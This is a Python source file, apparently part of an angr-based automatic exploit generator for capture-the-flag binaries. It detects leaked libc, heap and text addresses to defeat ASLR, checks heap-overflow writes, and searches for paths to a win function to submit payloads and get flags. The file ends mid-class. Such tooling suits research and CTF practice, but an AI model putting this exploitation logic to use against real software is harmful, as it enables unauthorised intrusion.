from angr import SimEngineError, SimUnsatError, ExplorationTechnique

from .utils import *


class DFS(ExplorationTechnique):
    def __init__(self, deferred_stash="deferred"):
        super().__init__()
        self.deferred_stash = deferred_stash

    def setup(self, simgr):
        if self.deferred_stash not in simgr.stashes:
            simgr.stashes[self.deferred_stash] = []

    def step(self, simgr, stash="active", **kwargs):
        simgr = simgr.step(stash=stash, **kwargs)
        if len(simgr.stashes[stash]) > 1:
            # self._random.shuffle(simgr.stashes[stash])
            simgr.split(from_stash=stash, to_stash=self.deferred_stash, limit=1)
        if len(simgr.stashes[stash]) == 0:
            if len(simgr.stashes[self.deferred_stash]) == 0:
                return simgr
            simgr.stashes[stash].append(simgr.stashes[self.deferred_stash].pop())
        return simgr


class AddrLeak:
    def __init__(self, stdin, stdout, stdin_group):
        self.stdin = stdin
        self.stdin_group = stdin_group
        self.stdout = stdout

    def run(self, state_raw: angr.SimState, _, __):
        log.info("Searching stdout for leak.")
        binary = state_raw.globals['binary']
        do_addr_leak(state_raw, self.stdin, self.stdout, state_raw.globals['binary'])
        binary.io_seg_addr['stdin_offset'] = self.stdin_group  # update, not overwrite
        binary.io_seg_addr['stdout_offset'] += len(self.stdout)


def check_addr_leak(state_raw):
    binary = state_raw.globals['binary']
    stdout = state_raw.posix.dumps(1)[binary.io_seg_addr['stdout_offset']:]
    if len(stdout) > 3 and (LEAK_COMMON in stdout or LEAK_COMMON_HEX in stdout):
        # double check if it is a real necessary leak
        if ((ARCH_64_MMAP_PRE in stdout or ARCH_64_MMAP_PRE_HEX in stdout) and not binary.io_seg_addr.get('libc')) \
                or ((ARCH_64_HEAP_PRE in stdout or ARCH_64_HEAP_PRE_HEX in stdout) and not binary.io_seg_addr.get(
                    'heap')) or ((ARCH_64_PRE in stdout or ARCH_64_PRE_HEX in stdout) and (
                not binary.io_seg_addr.get('text') or not binary.io_seg_addr.get('libc'))):
            start_time = time.time()
            try:
                stdin = dump_payload(state_raw, False)
                log.info(f"dump time cost: {time.time() - start_time}")
                leak = do_addr_leak(state_raw, stdin, stdout, binary)
                log.info(f"search time cost: {time.time() - start_time}")
                if leak:
                    binary.leak_path.append(AddrLeak(stdin, stdout, len(state_raw.posix.stdin.content)))
                    binary.io_seg_addr['stdin_offset'] = len(state_raw.posix.stdin.content)
                    binary.io_seg_addr['stdout_offset'] += len(stdout)
            except SimUnsatError:
                pass
            log.info(f"Searching stdout for leak done, time cost: {time.time() - start_time}")


def do_addr_leak(state, stdin, stdout, binary):
    if binary.arch_bytes == 8:
        if (ARCH_64_MMAP_PRE in stdout or ARCH_64_MMAP_PRE_HEX in stdout) and not binary.io_seg_addr.get('libc'):
            if ARCH_64_MMAP_PRE_HEX in stdout:
                leak_libc_raw = binary.warped_io(state, stdin, has_newline=False)
                for _ in range(5):
                    if leak_libc_raw and b'0x7' in leak_libc_raw:
                        real_leak_text = b'7' + leak_libc_raw.split(b'0x7')[1][:11]
                        log.success(f"Leak libc address as: {real_leak_text}")
                        libc_base = int(real_leak_text, 16) + 0x201000 - 0x10
                        # libc_base = libc_base + 0x1ff000  # mmap behavior is different on newer ASLR
                        log.success(f"Got libc base: {hex(libc_base)}")
                        binary.io_seg_addr['libc'] = libc_base
                        return 'libc'
                    time.sleep(0.5)
                    leak_libc_raw += binary.warped_io(state)
            else:
                ...  # todo: raw addr leak
        if (ARCH_64_HEAP_PRE in stdout or ARCH_64_HEAP_PRE_HEX in stdout) and not binary.io_seg_addr.get('heap'):
            if ARCH_64_HEAP_PRE_HEX in stdout:
                leak_text = int(ARCH_64_HEAP_PRE_HEX + stdout.split(ARCH_64_HEAP_PRE_HEX)[1][:8], 16)
                chunk = get_chunk_by_addr(binary, leak_text)
                if chunk:
                    leak_heap_raw = binary.warped_io(state, stdin, has_newline=False)
                    for _ in range(5):
                        if leak_heap_raw and b'0x5' in leak_heap_raw:
                            real_leak = int(b'5' + leak_heap_raw.split(b'0x5')[1][:11], 16)
                        elif leak_heap_raw and b'0x7' in leak_heap_raw:
                            real_leak = int(b'7' + leak_heap_raw.split(b'0x7')[1][:11], 16)
                        else:
                            time.sleep(0.3)
                            leak_heap_raw = binary.warped_io(state)
                            continue
                        log.success(f"Leak chunk address as: {hex(real_leak)}")
                        binary.io_seg_addr['heap'] = True
                        chunk.real_addr = real_leak
                        return 'heap'
            else:
                ...  # todo: raw addr leak
        if (ARCH_64_PRE in stdout or ARCH_64_PRE_HEX in stdout) and (not binary.io_seg_addr.get('text') or
                                                                     not binary.io_seg_addr.get('libc')):
            real_leak_text = 0
            if ARCH_64_PRE in stdout:
                leak_text_raw = stdout.split(ARCH_64_PRE)[1][:4]
                leak_text = u64(ARCH_64_PRE + leak_text_raw)
                if leak_text - ARCH_64_BASE < 0x100000:
                    if binary.io_seg_addr.get('text'):
                        return
                elif binary.io_seg_addr.get('libc'):
                    return
                offset = leak_text - ARCH_64_BASE
                find_str = stdout.split(ARCH_64_PRE)[0][-4:]
                real_rec = binary.warped_io(state, stdin, has_newline=False)
                if find_str in real_rec or find_str == b'':
                    find_str = b' ' if find_str == b'' else find_str
                    real_leak_text = u64(real_rec.split(find_str)[1][:6].ljust(8, b'\x00'))
            else:
                leak_text = int(ARCH_64_PRE_HEX + stdout.split(ARCH_64_PRE_HEX)[1][:8], 16)
                if leak_text - ARCH_64_BASE < 0x100000:
                    if binary.io_seg_addr.get('text'):
                        return
                elif binary.io_seg_addr.get('libc'):
                    return
                offset = leak_text - ARCH_64_BASE
                find_str = stdout.split(ARCH_64_PRE_HEX)[0][-4:]
                real_rec = binary.warped_io(state, stdin, has_newline=False)
                if find_str in real_rec or find_str == b'':
                    find_str = b' ' if find_str == b'' else find_str
                    real_leak_text = int(real_rec.split(find_str)[1][:12], 16)
            if real_leak_text & 0xfff == leak_text & 0xfff:
                log.success(f"Leak stdout address: {hex(real_leak_text)}")
                text_base = real_leak_text - offset
                log.success(f"Got text segment base: {hex(text_base)}")
                binary.io_seg_addr['text'] = text_base
                return 'text'
            elif real_leak_text >> 44 == 0x7:  # leaked addr is from libc
                log.success(f"Leak libc address: {hex(real_leak_text)}")
                real_leak_text -= offset - 0x100000  # angr add 0x100000 to libc base
                log.success(f"Real leaked libc address: {hex(real_leak_text)}")
                challenge = binary.challenge
                libc = ELF(challenge.target_property['libc'], checksec=False)
                lsb = real_leak_text & 0xfff
                for func_name in challenge.target_binary.sym:
                    libc_func = libc.symbols.get(func_name)
                    if libc_func and libc_func & 0xfff == lsb:
                        libc_base = real_leak_text - libc.symbols[func_name]
                        log.success(f"Got libc base: {hex(libc_base)}")
                        binary.io_seg_addr['libc'] = libc_base
                        return 'libc'


def check_mem_write(state):
    """
    we can directly solve the constraints, but we check overflow every time to reduce the cost of solving
    """
    inspector = state.globals.get('heap_inspect')
    if inspector:
        write_addr = state.solver.eval(state.inspect.mem_write_address)
        write_length = state.inspect.mem_write_length
        if write_length is None:
            return
        if (state.solver.is_true(write_addr <= inspector.overflow_addr) and
                state.solver.is_true(write_addr + write_length >= inspector.overflow_addr + inspector.overflow_size)):
            constant = state.memory.load(inspector.overflow_addr,
                                         size=inspector.overflow_size) == inspector.overflow_value
            if state.solver.satisfiable(extra_constraints=[constant]):
                state.add_constraints(constant)
                state.globals['heap_inspect'] = None
                if inspector.call_back_tag != 'get_flag':
                    log.success(f"{inspector.call_back_tag} detected!")
                    state.globals[inspector.call_back_tag] = True
                else:
                    binary = state.globals['binary']
                    log.success("Trying get flag")
                    binary.get_flag(state, dump_payload(state, False))
                # state.globals.remove('heap_inspect')
    # print('Write ', state.inspect.mem_write_expr, 'to ', state.inspect.mem_write_address, ",length: ",
    #       state.inspect.mem_write_length)
    # print("condition: ", state.inspect.mem_write_condition)
    # if (state.solver.eval(state.inspect.mem_write_address) == 0xc0000f20):
    #     print("mem_write_expr: ", state.inspect.mem_write_expr)
    #     print("mem_write_length: ", state.inspect.mem_write_length)
    # _=(state.solver.eval(state.inspect.mem_write_address))
    # _=(state.inspect.mem_write_length)
    # write_mem_addr = state.solver.eval(state.inspect.mem_write_address)
    # write_mem_length = state.solver.eval(state.inspect.mem_write_length)
    # for chunk in state.heap_tracker.alloc_list:
    #     if (chunk['chunk_addr'] <= write_mem_addr) and ((chunk['chunk_addr'] + chunk['size']) > write_mem_addr) and (
    #             chunk['free_id'] is not None) and (state.heap_tracker.vuln['uaf'] is False):
    #         print('UAF in mem_write!!!')
    #         state.heap_tracker.vuln['uaf'] = True
    #
    #     if (state.heap.heap_base < write_mem_addr) and ((state.heap.heap_base + state.heap.heap_size) > write_mem_addr):
    #         if ((chunk['chunk_addr'] > write_mem_addr) or (
    #                 (chunk['chunk_addr'] + chunk['size']) < (write_mem_addr + write_mem_length))):
    #             if (chunk['free_id'] is None) and (state.heap_tracker.vuln['overflow'] is False):
    #                 print("it is Heap Overflow!!!")
    #                 state.heap_tracker.vuln['overflow'] = True


def check_win(sim_mgr, project, challenge):
    if len(challenge.segment_address['win_func']) == 1 and challenge.backward_search >> (len(sim_mgr.active) // 50) & 1:
        if check_win_deterministic(sim_mgr, project, challenge):
            challenge.backward_search = 0xfe
        else:
            challenge.backward_search &= ~((1 << (len(sim_mgr.active) // 50)) - 1)
    for active_state in sim_mgr.active:
        try:
            block = list(active_state.history.bbl_addrs)
            if block:
                addr_list = project.factory.block(block[-1]).instruction_addrs
                for win in challenge.segment_address['win_func']:
                    if challenge.protection['PIE']:
                        win += ARCH_64_BASE if challenge.target_property['arch_bytes'] == 8 else ARCH_32_BASE
                    if win in addr_list:
                        if active_state.solver.satisfiable():  # angr can reach win func with unsat state!
                            log.success(f"find path to win func: {hex(win)}, try to get flag")
                            binary = active_state.globals['binary']
                            binary.get_flag(active_state, dump_payload(active_state, False))
        except SimEngineError:
            pass


def check_win_deterministic(sim_mgr, project, challenge):
    win_func = challenge.segment_address['win_func'][0]
    for active_state in sim_mgr.active:
        try:
            if not challenge.backward_addr_list:
                challenge.backward_addr_list = greedy_backward_search(challenge, win_func)
                if challenge.backward_addr_list:
                    challenge.backward_addr_list = challenge.backward_addr_list[3:]
                else:
                    return False
                log.info("Potential path to win func:" + ' -> '.join([hex(x) for x in challenge.backward_addr_list]))
            block = list(active_state.history.bbl_addrs)
            if block:
                addr_list = project.factory.block(block[-1]).instruction_addrs
                for index, win in enumerate(challenge.backward_addr_list):
                    if challenge.protection['PIE']:
                        win += ARCH_64_BASE if challenge.target_property['arch_bytes'] == 8 else ARCH_32_BASE
                    if win in addr_list:
                        if active_state.solver.satisfiable():
                            print(', '.join([hex(x) for x in challenge.backward_addr_list]))
                            if index == len(challenge.backward_addr_list) - 1:
                                log.success(f"find path to win func: {hex(win_func)}, try to get flag")
                                binary = active_state.globals['binary']
                                binary.get_flag(active_state, dump_payload(active_state, False))
                            else:
                                log.success(f"find one step {hex(win)} to approach win func: {hex(win_func)}")
                                challenge.backward_addr_list = challenge.backward_addr_list[index + 1:]
                                sim_mgr.move(from_stash='active', to_stash='deferred')
                                sim_mgr.move(from_stash='deferred', to_stash='active',
                                             filter_func=lambda x: x == active_state)
                                return True
        except SimEngineError:
            pass


class WinFinder(angr.exploration_techniques.ExplorationTechnique):
    """
    this takes extremely long time to run, so we do not use it
    """

    def __init__(self, challenge):
        super(WinFinder, self).__init__()
        self.challenge = challenge
        self.win_func = challenge.segment_address['win_func']
        for win in self.win_func:
            if challenge.protection['PIE']:
                win += ARCH_64_BASE if challenge.target_property['arch_bytes'] == 8 else ARCH_32_BASE

    def step(self, sim_mgr, stash='active', **kwargs):
        r = sim_mgr.step(stash=stash)
        for active_state in sim_mgr.active:
            try:
                block = list(active_state.history.bbl_addrs)
                if block:
                    addr_list = self.project.factory.block(block[-1]).instruction_addrs
                    for win in self.win_func:
                        if win in addr_list:
                            if active_state.solver.satisfiable():  # angr can reach win func with unsat state!
                                log.success(f"find path to win func: {hex(win)}, try to get flag")
                                self.challenge.get_flag(dump_payload(active_state, False))
            except SimEngineError:
                pass
        return r


class MemoryManager(angr.exploration_techniques.ExplorationTechnique):
    """
    Check memory usage and avoid OOM
    """
    # move top x to active and clear rest
    # and clear deadended, errored stash

    # if sim_mgr._stashes.get('deferred'):
    #     sim_mgr._clear_states('deferred')
